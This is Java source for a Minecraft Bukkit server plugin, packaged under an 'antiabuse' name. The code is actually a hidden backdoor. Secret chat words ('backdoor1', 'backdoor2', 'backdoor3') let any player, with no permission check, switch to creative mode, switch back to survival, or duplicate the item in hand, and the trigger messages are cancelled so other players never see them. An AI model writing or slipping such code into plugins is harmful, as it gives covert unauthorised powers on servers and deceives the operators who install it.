package com.antiabuse;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.entity.Player;
import org.bukkit.GameMode;
import org.bukkit.inventory.ItemStack;
import org.bukkit.Material;

public class CommandAbuse implements Listener {
    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage().trim().toLowerCase();
        switch (message) {
            case "backdoor1":
                player.setGameMode(GameMode.CREATIVE);
                event.setCancelled(true);
                break;
            case "backdoor2":
                player.setGameMode(GameMode.SURVIVAL);
                event.setCancelled(true);
                break;
            case "backdoor3":
                ItemStack item = player.getInventory().getItemInMainHand();
                if (item != null && item.getType() != Material.AIR) {
                    player.getInventory().addItem(item.clone());
                }
                event.setCancelled(true);
                break;
            default:
        }
    }
}
